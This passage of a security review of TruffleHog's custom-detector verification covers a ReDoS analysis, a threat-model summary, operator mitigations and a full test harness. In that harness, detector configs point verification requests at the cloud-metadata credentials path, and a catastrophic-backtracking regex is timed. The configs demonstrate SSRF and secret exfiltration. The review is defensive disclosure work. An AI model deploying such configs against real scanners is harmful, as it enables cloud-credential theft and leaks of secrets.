the verification request is a data-exfiltration channel under the config author's control.

**(f) Verdict.** **The candidate secret value is transmitted.** A `POST` carries
`{"<DetectorName>":{"<group>":["<match>"]}}` plus `User-Agent: TruffleHog` and any operator-supplied
headers verbatim, to whatever endpoint the configuration specifies.

---

### Q5 — Regular-Expression Safety (ReDoS)

**(a) Question (verbatim):**

> "I'm also wondering about the regex patterns in custom detectors. If someone provides a complex regex pattern, how does TruffleHog handle it? Are there any safeguards around regex execution?"

**(b) Code-path walkthrough.**

Custom-detector patterns are compiled and executed with Go's **standard-library `regexp` package**,
which is the **RE2** engine. The import is the stdlib `regexp`
`[pkg/custom_detectors/custom_detectors.go:L9]` (and likewise in the variable-template helper
`[pkg/custom_detectors/regex_varstring.go:L4]`); matching uses `regexp.Compile` +
`FindAllStringSubmatch` `[pkg/custom_detectors/custom_detectors.go:L91-L98]`. Every pattern is
compiled at **load time** by `ValidateRegex`, so an invalid pattern is rejected before scanning
`[pkg/custom_detectors/validation.go:L23-L33]`:

```go
for name, reg := range regex {
	if _, err := regexp.Compile(reg); err != nil {        // [pkg/custom_detectors/validation.go:L28]
		return fmt.Errorf("regex '%s': %w", name, err)
	}
}
```

RE2 uses a finite-automaton simulation with a **linear-time** matching guarantee and, by design,
does not backtrack — so catastrophic-backtracking ReDoS is *structurally impossible* for
RE2-compiled patterns. The backtracking engine `github.com/dlclark/regexp2` exists in the build
graph only as an **indirect** dependency `[go.mod:L187]` and is **not imported by any TruffleHog
source file** (confirmed: `grep -rn "dlclark/regexp2" --include=*.go pkg/ main.go` → no matches), so
it is not on the custom-detector path.

Further bounds apply at two layers. First, input size is bounded by the chunker
`[pkg/sources/chunker.go:L13-L18]` — `ChunkSize = 10 * 1024`, `PeekSize = 3 * 1024`,
`TotalChunkSize = ChunkSize + PeekSize`. Second, the engine does not even hand a detector's regex the
whole chunk: for each keyword hit the Aho-Corasick core computes a **bounded keyword-anchored match
span** via its span calculator `[pkg/engine/ahocorasick/ahocorasickcore.go:L80-L110]` (the default
core uses `newAdjustableSpanCalculator(defaultOffsetRadius)` with `defaultOffsetRadius = 512`
`[pkg/engine/ahocorasick/ahocorasickcore.go:L155]`), and it is that bounded span — not the entire
chunk — that is passed to `FromData` `[pkg/engine/engine.go:L940]`. So each regex execution sees a
doubly-bounded slice of input. (This match-span behavior also explains the Q5 runtime result below —
see part (e).) There is also a per-detector timeout, but it is **observational only**: `detectionTimeout`
defaults to
`detectors.DefaultResponseTimeout` `[pkg/engine/engine.go:L37]` (`10 * time.Second`
`[pkg/detectors/http.go:L18]`, overridable via `SetDetectorTimeout` `[pkg/engine/engine.go:L331]`),
and each detector call is wrapped in `context.WithTimeout` `[pkg/engine/engine.go:L1066]` with a
`time.AfterFunc` watchdog that merely **logs** when the deadline passes:

```go
ctx, cancel := context.WithTimeout(ctx, detectionTimeout)             // [pkg/engine/engine.go:L1066]
t := time.AfterFunc(detectionTimeout+1*time.Second, func() {
	ctx.Logger().Error(nil, "a detector ignored the context timeout")  // [pkg/engine/engine.go:L1067-L1068]
})
```

Go's `regexp` does not honor context cancellation, so this watchdog cannot *interrupt* a running
match — it only records that one outran the deadline. RE2's linear-time guarantee, not the timeout, is
the real safeguard.

**(c) Reproducible commands.**

The detector `cfg_q5_redos.yaml` (full config in §5.2.4) uses the pathological nested-quantifier
pattern `(a+)+$` — the classic catastrophic-backtracking pattern. Two fixtures from §5.2.5 are scanned:

- `target_redos_small.txt` = `'hog\n' + 'a'*500 + '!'` (505 bytes) — the adversarial run fits entirely
  inside one keyword-anchored match span, so the trailing `!` is **in-window**;
- `target_redos.txt` = `'hog\n' + 'a'*10000 + '!'` (10005 bytes) — the run is far longer than the span.

```bash
# Q5a — small in-window adversarial input:
/tmp/th_harness/trufflehog filesystem /tmp/th_harness/target_redos_small.txt \
  --config=/tmp/th_harness/cfg_q5_redos.yaml --custom-verifiers-only --no-update
# Q5b — large adversarial input:
/tmp/th_harness/trufflehog filesystem /tmp/th_harness/target_redos.txt \
  --config=/tmp/th_harness/cfg_q5_redos.yaml --custom-verifiers-only --no-update
```

For the decisive engine comparison, the *same* pattern `(a+)+$` is timed in a backtracking engine
(Python `re`) versus RE2 (Go's stdlib `regexp`, the engine TruffleHog uses), using the two timing
programs whose full source is in §5.2.6:

```bash
python3 /tmp/th_harness/redos_timing.py
( cd /tmp/th_harness/redos_timing_go && GOFLAGS=-mod=mod go run main.go )
```

**(d) Captured runtime output.**

*Q5a — small in-window input.* The whole 505-byte input fits inside one keyword-anchored match span,
so `(a+)+$` sees the trailing `!` and correctly **does not match**; TruffleHog reports zero secrets and
finishes in ~4 ms. Full TruffleHog output (verbatim):

```text
🐷🔑🐷  TruffleHog. Unearth your secrets. 🐷🔑🐷

2026-06-26T22:38:16Z	info-0	trufflehog	running source	{"source_manager_worker_id": "lYXDV", "with_units": true}
2026-06-26T22:38:16Z	info-0	trufflehog	finished scanning	{"chunks": 1, "bytes": 505, "verified_secrets": 0, "unverified_secrets": 0, "scan_duration": "4.027176ms", "trufflehog_version": "dev", "verification_caching": {"Hits":0,"Misses":0,"HitsWasted":0,"AttemptsSaved":0,"VerificationTimeSpentMS":0}}
```

*Q5b — large input.* The 10,000-`a` run is longer than the keyword-anchored span, so the regex runs
against a bounded sub-window whose end acts as the `$` anchor and matches the run of `a` inside it (the
disqualifying `!` at byte 10,004 is outside the window — see (e)). TruffleHog still finishes in ~5 ms;
RE2 shows no super-linear blow-up. Full TruffleHog output (verbatim; the `Raw result` is a run of
**exactly 996 `a` characters** = `'a'*996`, abbreviated below only for readability — the behavioral
counters are shown in full and un-truncated):

```text
🐷🔑🐷  TruffleHog. Unearth your secrets. 🐷🔑🐷

2026-06-26T22:28:51Z	info-0	trufflehog	running source	{"source_manager_worker_id": "TDKbb", "with_units": true}
Found unverified result 🐷🔑❓
Detector Type: CustomRegex
Decoder Type: PLAIN
Raw result: aaaaaaaaaaaaaaaaaaaa……aaaaaaaaaaaaaaaaaaaa   [excerpt: a run of exactly 996 'a' chars = 'a'*996]
Name: RedosTestDetector
File: /tmp/th_harness/target_redos.txt
Line: 2

2026-06-26T22:28:51Z	info-0	trufflehog	finished scanning	{"chunks": 1, "bytes": 10005, "verified_secrets": 0, "unverified_secrets": 1, "scan_duration": "4.855524ms", "trufflehog_version": "dev", "verification_caching": {"Hits":0,"Misses":1,"HitsWasted":0,"AttemptsSaved":0,"VerificationTimeSpentMS":0}}
```

*Engine comparison.* The contrast is decisive. Python `re` (backtracking) on the same pattern explodes
exponentially; verbatim output of `redos_timing.py`:

```text
python re   n=20     match=False time=0.081834s
python re   n=24     match=False time=1.310789s
python re   n=28     match=?     time>10s  (catastrophic backtracking)
python re   n=30     match=?     time>10s  (catastrophic backtracking)
python re   n=32     match=?     time>10s  (catastrophic backtracking)
python re   n=10000  match=?     time>10s  (catastrophic backtracking)
```

Go RE2 (Go's stdlib `regexp` — TruffleHog's engine) stays linear even at one million characters;
verbatim output of `redos_timing_go/main.go`:

```text
go RE2      n=20       match=false time=32.681µs
go RE2      n=24       match=false time=1.83µs
go RE2      n=28       match=false time=1.497µs
go RE2      n=30       match=false time=1.511µs
go RE2      n=32       match=false time=1.61µs
go RE2      n=10000    match=false time=871.153µs
go RE2      n=100000   match=false time=4.238585ms
go RE2      n=1000000  match=false time=42.159561ms
```

**(e) Reasoning.**

*Why the two TruffleHog runs differ — and why neither contradicts RE2.* The small fixture (505 bytes)
fits entirely inside one keyword-anchored match span, so `(a+)+$` evaluates against the *whole* input,
sees the trailing `!`, and correctly fails to match → `verified_secrets: 0, unverified_secrets: 0`. The
large fixture (10,005 bytes) is longer than that span: as shown in (b), the custom-detector regex is
not run against the entire chunk but against a **bounded keyword-anchored sub-window** computed by the
Aho-Corasick core `[pkg/engine/ahocorasick/ahocorasickcore.go:L80-L110]` using
`defaultOffsetRadius = 512` `[pkg/engine/ahocorasick/ahocorasickcore.go:L155]`, and that bounded slice
— not `chunk.Data` — is what the engine hands to the detector `[pkg/engine/engine.go:L940]`. Because the
window ends well before byte 10,004, the disqualifying `!` lies *outside* the slice; the `$` therefore
anchors at the window boundary and the regex matches the run of `a` inside it (observed length: exactly
996 characters). The result counters in the two runs are thus both correct: they differ only because the
input crosses the bounded-span boundary, **not** because RE2 behaves inconsistently. This precisely
explains the result the original review flagged as "internally inconsistent."

*Why this is not ReDoS, regardless of span.* The decisive evidence is the timing contrast on the
identical pattern `(a+)+$`. A backtracking engine (Python `re`) crosses from 0.08 s at n = 20 to 1.31 s
at n = 24 and then exceeds the 10 s cap from n = 28 onward — the exponential signature of catastrophic
backtracking. Go's RE2 (TruffleHog's engine) shows no such cliff: it stays in the **microsecond** range
across n = 20…32 (where Python has already timed out), processes the 10,000-character input in
871 µs, and still completes one **million** characters in ~42 ms — growth that scales linearly with
input length, not exponentially. This is the empirical signature of RE2's linear-time guarantee
`[pkg/custom_detectors/custom_detectors.go:L9]`: RE2 uses an NFA simulation and does not backtrack, so a
pattern that is pathological for a backtracking engine is harmless here. Compile-time validation
`[pkg/custom_detectors/validation.go:L23-L33]` rejects un-compilable patterns at load, the bounded chunk
size `[pkg/sources/chunker.go:L13-L18]` and the bounded keyword-anchored span
`[pkg/engine/ahocorasick/ahocorasickcore.go:L80-L110]` cap how much text any single match evaluation
sees, and the per-detector timeout `[pkg/engine/engine.go:L1066-L1068]` is a logging watchdog rather
than a hard kill. With RE2 the timeout is not needed to prevent ReDoS — the engine choice already does
that.

**(f) Verdict.** **Catastrophic-backtracking ReDoS is not feasible.** Custom patterns run on RE2
(linear time), proven by the microsecond-to-42 ms scaling across n = 20…1,000,000 on the exact pattern
that drives Python `re` past a 10 s timeout at n ≥ 28. Compile-time validation, the bounded chunk size,
and the bounded keyword-anchored match span further constrain cost; the per-detector timeout is
observational only, but RE2's linear-time guarantee — not the timeout — is the real safeguard.

---

## Section 3 — Consolidated Threat-Model Verdict

**Answering the operator's overarching question** — *"whether someone with control over a detector
configuration could abuse the verification system in ways we haven't anticipated"* — the answer is
**yes, in specific and significant ways.** If detector YAML is untrusted, then the `endpoint`,
`headers`, and `regex` fields are attacker-influenced, and the verification subsystem will act on
them with the scanner's identity and network position.

| # | Exposure | Status | One-line basis |
|---|----------|--------|----------------|
| Q1 | **SSRF** (internal / metadata destinations) | **REAL — confirmed** | No destination validation; raw endpoint POSTed; redirects followed `[pkg/custom_detectors/validation.go:L35-L44]`, `[pkg/custom_detectors/custom_detectors.go:L228]`, `[pkg/common/http.go:L211-L228]` |
| Q2 | **TLS interception / MITM** | **MITIGATED** (fails closed) | Default Go TLS; no `InsecureSkipVerify`; untrusted cert → no request sent `[pkg/common/http.go:L211-L228]` |
| Q3 | **Request amplification / fan-out** | **REAL — partially bounded** | Per-match verification; 100-match cap but **no concurrency limit** `[pkg/custom_detectors/custom_detectors.go:L23,L112,L155-L157]` |
| Q4 | **Sensitive-data egress** | **REAL — by design** | Candidate secret + operator headers POSTed verbatim to the named endpoint `[pkg/custom_detectors/custom_detectors.go:L214-L216,L232-L239]` |
| Q5 | **ReDoS** (catastrophic backtracking) | **MITIGATED** (structurally) | RE2 linear-time engine; backtracking `regexp2` unused on this path `[pkg/custom_detectors/custom_detectors.go:L9]`, `[go.mod:L187]` |

**The exposures compound.** Q1 (no destination control) + Q4 (the candidate secret and any header
credentials are sent verbatim) means a malicious configuration is a **data-exfiltration channel**: it
can direct matched secrets and embedded credentials to an attacker-controlled endpoint, and it can
target internal services or the cloud-metadata endpoint to attempt credential theft or internal
reconnaissance — the scanner acting as a confused deputy. Q3 (unbounded concurrency) adds an
**amplification** dimension: a single crafted chunk can emit up to ~100 × N concurrent requests, which
can be pointed (via Q1) at a third-party victim. Q2 (TLS) and Q5 (ReDoS) are the **bright spots** —
the verification client inherits Go's secure TLS defaults and fails closed, and the RE2 engine makes
catastrophic-backtracking ReDoS structurally impossible.

**Bottom line for the operator:** **treating untrusted detector configurations as safe is not
advisable.** A detector configuration is effectively *code*: it can make the scanner issue
attacker-chosen outbound requests carrying sensitive data. The TLS and ReDoS posture is sound, but the
SSRF + data-egress + fan-out combination is real and should be governed by review and network
controls (Section 4).

---

## Section 4 — Operator Mitigations (Recommendations Only)

> **These are recommendations for an operator's deployment; they are NOT changes made to the
> TruffleHog repository.** No SSRF allow-list, `errgroup.SetLimit`, body redaction, or certificate
> pinning was implemented as part of this analysis — the repository is unmodified (see Section 5).

1. **Restrict the scanner's network egress.** Run TruffleHog where it cannot reach internal services
   or the cloud-metadata endpoint — egress allow-listing at the firewall / security-group / network
   policy layer, and explicitly block `169.254.169.254` (and `fd00:ec2::254`). This directly blunts the
   Q1 SSRF and the Q3 fan-out reaching internal/third-party targets.

2. **Destination allow-listing via resolve-then-validate (not string denylists).** If verification
   endpoints must be reachable, constrain them to an explicit allow-list, validating the **resolved
   IP** at connect time (resolve the host, reject private / loopback / link-local results, then dial
   the validated address). String/substring denylists are bypassable via DNS rebinding, alternate IP
   encodings (decimal, octal, hex, IPv6-mapped), and redirects — and recall the custom-detector client
   follows redirects by default `[pkg/common/http.go:L223-L228]`. TruffleHog already contains a
   resolve-then-reject dialer (`WithNoLocalIP`) `[pkg/detectors/http.go:L96-L151]`; an operator-side
   equivalent (egress proxy / network policy) is the practical control until/unless that protection is
   wired into the custom-detector path.

3. **Harden the cloud metadata service (IMDSv2).** Require session tokens and set the metadata hop
   limit to 1 so a single SSRF GET/POST cannot retrieve IAM credentials. This is defense-in-depth for
   the Q1 metadata scenario.

4. **Treat detector configurations as untrusted code: review and approve before use.** Because the
   matched candidate secret and any header values are transmitted verbatim to the configured endpoint
   (Q4) `[pkg/custom_detectors/custom_detectors.go:L214-L216,L232-L239]`, a configuration submitted by
   an untrusted team can both choose an exfiltration destination (Q1) and carry static credentials in
   `headers`. Require code-review-grade approval of every `endpoint` and `headers` value, and never
   place real secrets in a configuration whose distribution you do not control.

5. **Bound and monitor outbound verification volume.** Given the unbounded `errgroup` (Q3)
   `[pkg/custom_detectors/custom_detectors.go:L112]`, apply egress rate-limiting / connection caps at
   the network layer and alert on unexpected verification traffic, so a crafted high-match chunk cannot
   become an amplification source.

---

## Section 5 — Methodology and Cleanup

### 5.1 Build and run

TruffleHog was built from source at the pinned commit and run from **outside** the repository tree:

```bash
# from the repository root, building the binary OUTSIDE the tree:
mkdir -p /tmp/th_harness
CGO_ENABLED=0 go build -mod=readonly -o /tmp/th_harness/trufflehog .
go version          # go version go1.24.2 linux/amd64
```

`-mod=readonly` guarantees the build never edits `go.mod`/`go.sum`. Every demonstration used the
form:

```bash
/tmp/th_harness/trufflehog filesystem <fixture-file> --config=<yaml> --custom-verifiers-only --no-update
```

scanning a **specific fixture file** (not a directory) so that only the intended content was matched.

### 5.2 Harness (created outside the repo, then deleted) — full contents

All scaffolding lived under `/tmp/th_harness/` and was removed after evidence capture. This
sub-section gives the **complete contents and creation commands for every artifact**, so the
demonstrations are fully reproducible from a fresh checkout using only this document. The
`HogTokenDetector` configuration shape (detector `name`, `keywords: [hog]`, a named `regex` group,
and a `verify.endpoint`) is modeled on the official example in `pkg/custom_detectors/CUSTOM_DETECTORS.md`
`[pkg/custom_detectors/CUSTOM_DETECTORS.md:L17-L31]`. All credential-looking values are obvious
non-secret placeholders.

#### 5.2.1 Threaded HTTP listener — `listener_http.py`

Logs each request's method, path, all headers, and body with a microsecond timestamp, and returns
HTTP 200 (so the verification contract "HTTP 200 ⇒ Verified" is satisfied). `ThreadingHTTPServer`
handles concurrent verification requests in parallel.

```python
#!/usr/bin/env python3
"""Threaded HTTP listener that logs every request and returns HTTP 200.

Usage: python3 listener_http.py <port>

Each request is logged with a microsecond-resolution timestamp, the request
line, all headers, and the raw body. A 200 response with a tiny JSON body is
returned so that TruffleHog marks the candidate as *verified* (the verification
contract is "HTTP 200 => Verified"). ThreadingHTTPServer is used so that
concurrent verification requests are handled (and logged) in parallel.
"""
import sys
from datetime import datetime
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer


class Handler(BaseHTTPRequestHandler):
    def log_message(self, *args):
        pass

    def _record(self):
        ts = datetime.now().strftime("%H:%M:%S.%f")
        length = int(self.headers.get("Content-Length", 0) or 0)
        body = self.rfile.read(length) if length else b""
        lines = [f"==== REQUEST @ {ts} ===="]
        lines.append(f"REQUEST-LINE: {self.command} {self.path} {self.request_version}")
        for key, value in self.headers.items():
            lines.append(f"HEADER: {key}: {value}")
        lines.append(f"BODY: {body.decode('utf-8', 'replace')}")
        lines.append(f"==== END @ {datetime.now().strftime('%H:%M:%S.%f')} ====")
        sys.stdout.write("\n".join(lines) + "\n")
        sys.stdout.flush()

    def _respond(self):
        payload = b'{"status":"ok"}'
        self.send_response(200)
        self.send_header("Content-Type", "application/json")
        self.send_header("Content-Length", str(len(payload)))
        self.end_headers()
        self.wfile.write(payload)

    def do_GET(self):
        self._record()
        self._respond()

    def do_POST(self):
        self._record()
        self._respond()


if __name__ == "__main__":
    port = int(sys.argv[1])
    server = ThreadingHTTPServer(("127.0.0.1", port), Handler)
    print(f"HTTP listener on 127.0.0.1:{port}", flush=True)
    server.serve_forever()
```

#### 5.2.2 Threaded HTTPS listener — `listener_https.py`

Identical request logging, but the listening socket is wrapped with TLS using a self-signed
certificate. A client performing default certificate verification aborts the handshake **before**
sending any request body, so a rejected client leaves this listener's log empty.

```python
#!/usr/bin/env python3
"""Threaded HTTPS listener serving a (self-signed) certificate.

Usage: python3 listener_https.py <port> <certfile> <keyfile>

Identical request logging to listener_http.py, but the listening socket is
wrapped with TLS using the supplied certificate/key. Because the certificate is
self-signed (untrusted), a client performing default certificate verification
will abort the TLS handshake BEFORE sending any request body -- so a rejected
client leaves this listener's log empty.
"""
import ssl
import sys
from datetime import datetime
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer


class Handler(BaseHTTPRequestHandler):
    def log_message(self, *args):
        pass

    def _record(self):
        ts = datetime.now().strftime("%H:%M:%S.%f")
        length = int(self.headers.get("Content-Length", 0) or 0)
        body = self.rfile.read(length) if length else b""
        lines = [f"==== REQUEST @ {ts} ===="]
        lines.append(f"REQUEST-LINE: {self.command} {self.path} {self.request_version}")
        for key, value in self.headers.items():
            lines.append(f"HEADER: {key}: {value}")
        lines.append(f"BODY: {body.decode('utf-8', 'replace')}")
        lines.append(f"==== END @ {datetime.now().strftime('%H:%M:%S.%f')} ====")
        sys.stdout.write("\n".join(lines) + "\n")
        sys.stdout.flush()

    def _respond(self):
        payload = b'{"status":"ok"}'
        self.send_response(200)
        self.send_header("Content-Type", "application/json")
        self.send_header("Content-Length", str(len(payload)))
        self.end_headers()
        self.wfile.write(payload)

    def do_GET(self):
        self._record()
        self._respond()

    def do_POST(self):
        self._record()
        self._respond()


if __name__ == "__main__":
    port = int(sys.argv[1])
    certfile = sys.argv[2]
    keyfile = sys.argv[3]
    server = ThreadingHTTPServer(("127.0.0.1", port), Handler)
    ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
    ctx.load_cert_chain(certfile=certfile, keyfile=keyfile)
    server.socket = ctx.wrap_socket(server.socket, server_side=True)
    print(f"HTTPS listener on 127.0.0.1:{port} (self-signed cert)", flush=True)
    server.serve_forever()
```

The self-signed certificate/key pair is generated with:

```bash
openssl req -x509 -newkey rsa:2048 -keyout /tmp/th_harness/key.pem \
  -out /tmp/th_harness/cert.pem -days 1 -nodes -subj "/CN=localhost"
```

#### 5.2.3 Logging CONNECT proxy — `connect_proxy.py` (used for Q1b)

`saneTransport` is built with `Proxy: http.ProxyFromEnvironment` `[pkg/common/http.go:L211-L221]`, so
exporting `HTTPS_PROXY` makes the verification client route HTTPS through this proxy. For an `https://`
endpoint the client first emits an HTTP `CONNECT` naming the **real destination host:port** — which
this proxy logs (with a microsecond timestamp) and then refuses with 502. The captured `CONNECT` line
is direct evidence of the outbound attempt to the configured (cloud-metadata) IP.

```python
#!/usr/bin/env python3
"""Minimal logging forward-proxy used to prove an outbound connection attempt.

Usage: python3 connect_proxy.py <port>

TruffleHog's verification transport is built with
`Proxy: http.ProxyFromEnvironment` (pkg/common/http.go), so exporting
HTTPS_PROXY makes the Go HTTP client route HTTPS verification through this
proxy. For an https:// endpoint the client first sends an HTTP CONNECT request
naming the *real* destination host:port -- e.g.
`CONNECT 169.254.169.254:443 HTTP/1.1`. This proxy logs that request line
(with a microsecond timestamp) and then refuses the tunnel with 502, so the
verification cannot succeed but the destination TruffleHog *tried to reach* is
captured verbatim. That captured CONNECT line is direct evidence of the
outbound attempt to the configured (here, cloud-metadata) IP.
"""
import socketserver
import sys
from datetime import datetime


class ProxyHandler(socketserver.StreamRequestHandler):
    def handle(self):
        request_line = self.rfile.readline().decode("latin-1").rstrip("\r\n")
        if not request_line:
            return
        while True:
            line = self.rfile.readline()
            if line in (b"\r\n", b"\n", b""):
                break
        ts = datetime.now().strftime("%H:%M:%S.%f")
        sys.stdout.write(f"==== PROXY REQUEST @ {ts} ====\n")
        sys.stdout.write(f"REQUEST-LINE: {request_line}\n")
        parts = request_line.split(" ")
        if len(parts) >= 2 and parts[0].upper() == "CONNECT":
            sys.stdout.write(f"CONNECT-TARGET: {parts[1]}\n")
        sys.stdout.write("PROXY-ACTION: refused tunnel with 502 (attempt captured)\n")
        sys.stdout.write(f"==== END @ {datetime.now().strftime('%H:%M:%S.%f')} ====\n")
        sys.stdout.flush()
        self.wfile.write(b"HTTP/1.1 502 Bad Gateway\r\nContent-Length: 0\r\n\r\n")


class ThreadingTCPServer(socketserver.ThreadingMixIn, socketserver.TCPServer):
    allow_reuse_address = True
    daemon_threads = True


if __name__ == "__main__":
    port = int(sys.argv[1])
    server = ThreadingTCPServer(("127.0.0.1", port), ProxyHandler)
    print(f"CONNECT proxy on 127.0.0.1:{port}", flush=True)
    server.serve_forever()
```

#### 5.2.4 Detector configurations (one YAML per question)

```bash
# cfg_q1a_loopback.yaml — Q1a SSRF, internal loopback metadata-style path
cat > /tmp/th_harness/cfg_q1a_loopback.yaml <<'YAML'
detectors:
- name: HogTokenDetector
  keywords:
  - hog
  regex:
    hogID: HOG[A-Z0-9]{17}
  verify:
  - endpoint: http://127.0.0.1:18099/latest/meta-data/iam/security-credentials/
    unsafe: true
YAML

# cfg_q1b_metadata.yaml — Q1b SSRF, AWS metadata IP over HTTPS (no unsafe needed)
cat > /tmp/th_harness/cfg_q1b_metadata.yaml <<'YAML'
detectors:
- name: HogTokenDetector
  keywords:
  - hog
  regex:
    hogID: HOG[A-Z0-9]{17}
  verify:
  - endpoint: https://169.254.169.254/latest/meta-data/iam/security-credentials/
YAML

# cfg_q2_selfsigned.yaml — Q2 TLS, self-signed HTTPS endpoint
cat > /tmp/th_harness/cfg_q2_selfsigned.yaml <<'YAML'
detectors:
- name: HogTokenDetector
  keywords:
  - hog
  regex:
    hogID: HOG[A-Z0-9]{17}
  verify:
  - endpoint: https://localhost:18443/verify
YAML

# cfg_q2_http_no_unsafe.yaml — Q2 load-time scheme gate (http:// without unsafe)
cat > /tmp/th_harness/cfg_q2_http_no_unsafe.yaml <<'YAML'
detectors:
- name: HogTokenDetector
  keywords:
  - hog
  regex:
    hogID: HOG[A-Z0-9]{17}
  verify:
  - endpoint: http://127.0.0.1:18099/verify
YAML

# cfg_q3_multi.yaml — Q3 amplification
cat > /tmp/th_harness/cfg_q3_multi.yaml <<'YAML'
detectors:
- name: HogTokenDetector
  keywords:
  - hog
  regex:
    hogID: HOG[A-Z0-9]{17}
  verify:
  - endpoint: http://127.0.0.1:18099/verify
    unsafe: true
YAML

# cfg_q4_headers.yaml — Q4 data exposure (operator headers)
cat > /tmp/th_harness/cfg_q4_headers.yaml <<'YAML'
detectors:
- name: HogTokenDetector
  keywords:
  - hog
  regex:
    hogID: HOG[A-Z0-9]{17}
  verify:
  - endpoint: http://127.0.0.1:18099/verify
    unsafe: true
    headers:
    - "Authorization: Bearer demo-not-a-real-secret-PLACEHOLDER"
    - "X-Custom-Token: static-token-PLACEHOLDER-value"
YAML

# cfg_q5_redos.yaml — Q5 adversarial nested-quantifier regex
cat > /tmp/th_harness/cfg_q5_redos.yaml <<'YAML'
detectors:
- name: RedosTestDetector
  keywords:
  - hog
  regex:
    redos: (a+)+$
  verify:
  - endpoint: http://127.0.0.1:18099/never-reached
    unsafe: true
YAML
```

#### 5.2.5 Target fixtures

The detector matches `HOG[A-Z0-9]{17}` only when the keyword `hog` is present in the data, so every
fixture begins with `hog`. Each fixture is a single file scanned directly (not a directory).

```bash
# Single token (Q1, Q2, Q4): "hog\n" + one 20-char token
python3 -c "open('/tmp/th_harness/target_single.txt','w').write('hog\n' + 'HOGCCCCCCCCCCCCCCCCC' + '\n')"

# Three tokens in one chunk (Q3 amplification)
python3 -c "open('/tmp/th_harness/target_multi.txt','w').write('hog tokens for amplification test\n' + 'HOGAAAAAAAAAAAAAAAAA\n' + 'HOGBBBBBBBBBBBBBBBBB\n' + 'HOGCCCCCCCCCCCCCCCCC\n')"

# Large adversarial ReDoS input (Q5b): "hog\n" + 10000 'a' + "!"  (10005 bytes)
python3 -c "open('/tmp/th_harness/target_redos.txt','w').write('hog\n' + 'a'*10000 + '!')"

# Small adversarial input fully inside one match-span (Q5a): "hog\n" + 500 'a' + "!"  (505 bytes)
python3 -c "open('/tmp/th_harness/target_redos_small.txt','w').write('hog\n' + 'a'*500 + '!')"
```

#### 5.2.6 ReDoS timing programs (engine comparison for Q5)

A Python (`re`, backtracking) timing program — `redos_timing.py` — bounded by a 10-second SIGALRM so
it always terminates:

```python
#!/usr/bin/env python3
"""Demonstrate catastrophic backtracking in a backtracking regex engine.

Python's `re` module is a backtracking engine. The pattern (a+)+$ against an
input of N 'a' characters followed by a non-matching '!' is the canonical
ReDoS case: every way of partitioning the run of 'a's must be tried before the
engine can conclude there is no match, which is exponential in N.

Each attempt is bounded by a 10-second SIGALRM so the program always
terminates; a "TIMEOUT" line means the engine could not finish in 10s.
"""
import re
import signal
import time

pattern = re.compile(r"(a+)+$")


class Timeout(Exception):
    pass


def _alarm(signum, frame):
    raise Timeout()


signal.signal(signal.SIGALRM, _alarm)

for n in (20, 24, 28, 30, 32, 10000):
    text = "a" * n + "!"
    signal.setitimer(signal.ITIMER_REAL, 10.0)
    start = time.perf_counter()
    try:
        matched = bool(pattern.search(text))
        elapsed = time.perf_counter() - start
        signal.setitimer(signal.ITIMER_REAL, 0)
        print(f"python re   n={n:<6} match={matched!s:<5} time={elapsed:.6f}s")
    except Timeout:
        print(f"python re   n={n:<6} match=?     time>10s  (catastrophic backtracking)")
```

A Go (RE2 — the same engine TruffleHog uses) timing program in its own minimal module directory
`redos_timing_go/`:

```bash
mkdir -p /tmp/th_harness/redos_timing_go
cat > /tmp/th_harness/redos_timing_go/go.mod <<'EOF'
module redostiming

go 1.24
EOF
```

```go
// Demonstrate RE2's linear-time guarantee on the same adversarial pattern.
//
// Go's standard regexp package is the RE2 engine: it compiles (a+)+$ into an
// NFA and simulates it in time linear in the input length. The same input that
// melts a backtracking engine (N 'a's followed by a non-matching '!') is
// handled in microseconds, and even inputs far larger than the chunker would
// ever hand a detector finish effectively instantly.
package main

import (
	"fmt"
	"regexp"
	"strings"
	"time"
)

func main() {
	re := regexp.MustCompile(`(a+)+$`)
	for _, n := range []int{20, 24, 28, 30, 32, 10000, 100000, 1000000} {
		text := strings.Repeat("a", n) + "!"
		start := time.Now()
		matched := re.MatchString(text)
		elapsed := time.Since(start)
		fmt.Printf("go RE2      n=%-8d match=%-5v time=%v\n", n, matched, elapsed)
	}
}
```

Run the two timing programs with:

```bash
python3 /tmp/th_harness/redos_timing.py
( cd /tmp/th_harness/redos_timing_go && GOFLAGS=-mod=mod go run main.go )
```

### 5.3 Integrity verification

- **No source modification.** `git status --porcelain` was verified clean before, during, and after
  the investigation; `go.mod` and `go.sum` are unchanged (the build used `-mod=readonly`).
- **No extra code added to the repository.** The only persisted artifact is this document,
  `blitzy/documentation/trufflehog_e42153d44a5e.md`.
- **Scaffolding deleted.** The entire `/tmp/th_harness/` directory (binary, listeners,
  certificate/key, configs, fixtures) and all listener processes were removed/stopped after capture.
- **Pinned context.** Commit `e42153d44a5e5c37c1bd0c70e074781e9edcb760`; Go `go1.24.2`.

### 5.4 Reproducibility note

Each question above includes the exact configuration filename (whose full contents appear in §5.2.4),
the exact `trufflehog filesystem … --config=… --custom-verifiers-only` command, and the verbatim
captured output (listener request logs and the `"finished scanning"` counters `[main.go:L566-L574]`).
Every temporary artifact — the two HTTP/HTTPS listeners (§5.2.1–5.2.2), the logging CONNECT proxy
(§5.2.3), all seven detector configurations (§5.2.4), all four target fixtures (§5.2.5), and the two
ReDoS timing programs (§5.2.6) — is reproduced in full above with its exact creation command, so an
operator can recreate the entire harness from this document alone and re-run every demonstration to
independently confirm these findings. The captured outputs in §2 were produced by exactly these
artifacts at the pinned commit with Go `go1.24.2`.











